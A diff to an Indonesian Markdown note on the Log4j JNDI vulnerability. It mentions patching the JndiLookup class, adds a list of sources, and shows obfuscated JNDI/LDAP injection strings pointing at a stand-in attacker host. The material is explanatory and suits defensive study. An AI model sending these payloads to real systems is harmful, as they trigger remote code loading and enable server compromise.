@@ -17,3 +17,9 @@ Ganti kelas `org.apache.logging.log4j.core.lookup.JndiLookup` ke versi yang tela
 `${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://somesitehackerofhell.com/z}`<br>
 `${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://somesitehackerofhell.com/z}`<br>
 dsb.
+
+---
+Sources:<br>
+https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words/blob/main/README.md<br>
+https://www.lunasec.io/docs/blog/log4j-zero-day/<br>
+https://github.com/Glavo/log4j-patch<br>
